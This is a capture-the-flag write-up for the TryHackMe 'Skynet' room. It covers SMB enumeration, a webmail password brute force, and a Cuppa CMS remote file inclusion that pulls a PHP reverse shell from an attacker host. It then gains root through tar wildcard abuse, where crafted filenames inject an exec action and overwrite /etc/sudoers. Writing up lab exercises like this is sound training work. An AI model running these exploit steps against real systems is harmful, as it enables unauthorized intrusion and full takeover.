---
title: "Skynet"
platform: "TryHackMe"
difficulty: "Easy"
date: "2026-06-25"
tags: ["linux", "smb"]
excerpt: "A vulnerable Terminator themed Linux machine."
icon: "https://tryhackme-images.s3.amazonaws.com/room-icons/78628bbf76bf1992a8420cdb43e59f2d.jpeg"
roomUrl: "https://tryhackme.com/room/skynet"
---

## Initial Access
Every successful attack starts with **enumeration**.
The goal is simple: identify exposed services and understand the attack surface before doing anything noisy.

However, before jumping into scanning, it’s good practice to ensure the target is accessed correctly.

---

## Host Configuration
Edit your hosts file using an editor of your choice:  
```bash
sudo vi /etc/hosts
```

Add the target mapping at the end of the file (make sure to use a tab between the target IP and the hostname):  
```bash
<TARGET_IP>    skynet.thm
```

### Why this matters
Using a hostname instead of a raw IP is more than just convenience:  
- Some web applications rely on virtual host routing (vhosts)  
- Certain functionality may only be exposed when accessed via the correct domain  
- It ensures we are interacting with the application exactly as intended  

👉 From this point forward, I’ll use `skynet.thm` instead of the IP address.

## Service Enumeration
A comprehensive Nmap scan was performed to identify open ports, running services, and operating system information:
``` bash
nmap -sV -sC -p- -O -T4 <TARGET_IP>
```

![Nmap Scan Screenshot](/assets/writeups/thm-rooms/skynet/nmap.png)

### Why this matters
- `-sV` detects service versions → useful for known exploits  
- `-sC` runs default scripts → quick vulnerability hints  
- `-p-` scans all ports (1–65535) → no port left unchecked (not just the default top 1000)
- `-O` enable operating system fingerprinting  
- `-T4` sets the timing template → makes the scan faster

### Findings
- Port 22/TCP → SSH
- Port 80/TCP → HTTP (Apache)
- Port 110/TCP → POP3 (Dovecot)
- Port 139/TCP → NetBIOS/SMB
- Port 143/TCP → IMAP (Dovecot)
- Port 445/TCP → SMB (Samba 4.3.11)

👉 Multiple services exposed - SMB and HTTP are the most interesting attack surfaces.

---

## SMB Enumeration
With SMB open, I ran `enum4linux` to gather share information and user details:

```bash
enum4linux -a <TARGET_IP>
```
 
![Enum4linux Screenshot](/assets/writeups/thm-rooms/skynet/enum4linux.png)
 
### Findings
- Share `anonymous` → accessible without credentials  
- Share `milesdyson` → requires credentials  
- Valid system user: `milesdyson`  

### Why this matters
- Anonymous SMB shares often contain sensitive files  
- Discovering a valid username removes the need to brute force it later  

👉 Let's dig into the anonymous share.

---

## Anonymous SMB Share
Connected to the anonymous share and downloaded all files:

```bash
smbclient //<TARGET_IP>/anonymous -N
```
 
![SMB Anonymous Screenshot](/assets/writeups/thm-rooms/skynet/smb_anonymous.png)

### Discovery
- `attention.txt` → a notice from Miles Dyson stating that a system malfunction caused passwords to be changed and all employees must update theirs  
- `log1.txt` → a list of passwords  

### Why this matters
- `attention.txt` confirms `milesdyson` as an active, relevant user on the system  
- The password list is likely the set of new passwords referenced in the notice  
- Combined with the known username, this is a ready-made credential set  

👉 We now have a username and a wordlist - time to test them.

---

## Web Enumeration
Navigated to the web server:
 
```http
http://skynet.thm
```
 
![Website Screenshot](/assets/writeups/thm-rooms/skynet/web.png)


### Observation
- A Skynet-themed search page  
- No obvious functionality - searches POST without results  

👉 Hidden directories likely exist. Time to brute force.

---

## Directory Brute Forcing
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://skynet.thm/
```
 
![Gobuster Screenshot](/assets/writeups/thm-rooms/skynet/gobuster.png)
 
### Findings
- `/squirrelmail` → webmail login page  
- `/admin`, `/config`, `/ai`, `/css`, `/js`  

👉 SquirrelMail is the most interesting - it's an authentication target.

---

## SquirrelMail Login
Navigated to the webmail interface:

```http
http://skynet.thm/squirrelmail
```

![SquirrelMail Login Screenshot](/assets/writeups/thm-rooms/skynet/squirrelmail_login.png)
 
Using Burp Suite Intruder, I captured the login request and brute forced the password field with the list recovered from `log1.txt`:
 
``` 
Username: milesdyson
Wordlist: log1.txt
Attack type: Sniper
```
 
![Burp Intruder Screenshot](/assets/writeups/thm-rooms/skynet/burp_intruder.png)
 
A response with a different length indicated the valid credential.
 
![SquirrelMail Inbox Screenshot](/assets/writeups/thm-rooms/skynet/squirrelmail_inbox.png)
 
### Discovery
Three emails in the inbox:
- One containing the **SMB share password** for `milesdyson`  
- Two others containing an unusual repeating phrase (one in plaintext, one in binary)  

### Why this matters
- Internal webmail often holds credentials for other services  
- Recovering the SMB password allows access to the personal share 
 
👉 We now have credentials for the `milesdyson` SMB share.
 
---

## milesdyson SMB Share
Connected to Miles' personal share using the recovered password:
 
```bash
smbclient //<TARGET_IP>/milesdyson -U milesdyson
```
 
![Miles SMB Screenshot](/assets/writeups/thm-rooms/skynet/smb_miles.png)
 
### Discovery
Inside `notes/important.txt`:
- A reference to a **hidden web directory**: `/45kra24zxs28v3yd`  
- A mention of a CMS  

### Why this matters
- Hidden directories bypass standard enumeration  
- A CMS means an admin panel and potential exploit surface  

👉 Let's investigate the hidden directory.

---

## Hidden Directory
Navigated to the hidden path:
 
```http
http://skynet.thm/45kra24zxs28v3yd
```
 
![Hidden Directory Screenshot](/assets/writeups/thm-rooms/skynet/hidden_dir.png)
 d
### Observation
- A static page - nothing directly exploitable  
- The note mentioned a CMS, so I ran another directory scan  
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://skynet.thm/45kra24zxs28v3yd/
```
 
![Gobuster CMS Screenshot](/assets/writeups/thm-rooms/skynet/gobuster_cms.png)
 
### Finding
- `/administrator` → CMS admin panel (Cuppa CMS)

---

## RFI Vulnerability (Cuppa CMS)
Searched for known vulnerabilities:
 
```bash
searchsploit cuppa
```
 
![Searchsploit Screenshot](/assets/writeups/thm-rooms/skynet/searchsploit.png)
![Cuppa CMS Vulnerability Description Screenshot](/assets/writeups/thm-rooms/skynet/cuppa_cms_vuln_desc.png)
 
### Finding
- Cuppa CMS has a known **Remote File Inclusion (RFI) / Local File Inclusion (LFI)** vulnerability  
- The vulnerable parameter is `urlConfig` in `alertConfigField.php`  

### Why this matters
- RFI allows including a remote file hosted on our machine  
- If that file is a PHP reverse shell, we get code execution  

---


## Remote Code Execution
Set up a PHP reverse shell (PentestMonkey) and hosted it with Python:
 
```bash
python3 -m http.server 80
```
 
Started a listener:
 
```bash
nc -lvnp 1234
```
 
Triggered the RFI:
 
```http
http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<ATTACKER_IP>/php-reverse-shell.php
```
 
![RFI Exploit Screenshot](/assets/writeups/thm-rooms/skynet/rfi_exploit.png)
 
### Why this worked
- The `urlConfig` parameter is passed directly to a PHP include  
- No sanitization → the server fetches and executes our script  
- The shell calls back to our listener  

👉 Shell obtained as `www-data`.
 
---

## Stabilizing Shell
```bash
# On victim machine
python3 -c 'import pty; pty.spawn("/bin/bash")'
 
# Background the shell
Ctrl+Z
 
# On attacker machine
stty raw -echo ; fg
 
# Then press Enter twice
export TERM=xterm
```
 
### Why this matters
- Fixes broken terminal behavior (no tab completion, no arrow keys)  
- Enables proper interactive command execution  

---

## User Flag
With shell access as `www-data`:
 
```bash
cat /home/milesdyson/user.txt
```
 
![User Flag Screenshot](/assets/writeups/thm-rooms/skynet/user_flag.png)
 
👉 User flag obtained.
 
---

## Privilege Escalation
I enumerated the system for escalation paths. Manual inspection of cron jobs and running LinPEAS revealed a backup script:
 
```bash
cat /etc/crontab
```
 
![Crontab Screenshot](/assets/writeups/thm-rooms/skynet/crontab.png)
 
### Key Finding
- A cronjob runs `/home/milesdyson/backups/backup.sh` **as root**  
- The script uses `tar` with a wildcard (`*`) on `/var/www/html`  

### Why this matters
- `tar` wildcard abuse allows injecting filenames that are interpreted as command-line flags  
- Since the job runs as root, any injected command executes with root privileges  

---

## Tar Wildcard Abuse
Moved to the directory being archived and created the exploit files:
 
```bash
cd /var/www/html
 
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html" > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html" > --checkpoint=1
```
 
![Tar Exploit Screenshot](/assets/writeups/thm-rooms/skynet/tar_exploit.png)
 
### How this works
- `--checkpoint=1` makes tar fire a checkpoint after every file  
- `--checkpoint-action=exec=sh privesc.sh` executes our script at each checkpoint  
- These filenames are picked up as tar arguments via the wildcard expansion  
- `privesc.sh` overwrites `/etc/sudoers` to grant `www-data` passwordless sudo  

👉 Waited for the cronjob to run.

---

## Root Access
After the cron job executed:
 
```bash
sudo -l
```
 
![Sudo Screenshot](/assets/writeups/thm-rooms/skynet/sudo.png)
 
```bash
sudo cat /root/root.txt
```
 
![Root Flag Screenshot](/assets/writeups/thm-rooms/skynet/root_flag.png)
 
👉 Root flag successfully captured.

---
 
## Conclusion
### Key Lessons
- Anonymous SMB shares can leak passwords and directory paths  
- Always check internal email after gaining credentials - it often holds secrets  
- Hidden directories require re-running directory brute forcing at each new path  
- `tar` wildcard abuse is a classic and often overlooked privilege escalation vector  
- Cronjobs running as root with user-writable scripts or directories are critical vulnerabilities  

---
 
## Attack Chain
SMB Anonymous → Passwords → SquirrelMail → SMB Miles → Hidden Directory → Cuppa RFI → RCE → Tar Wildcard Abuse → Root
 
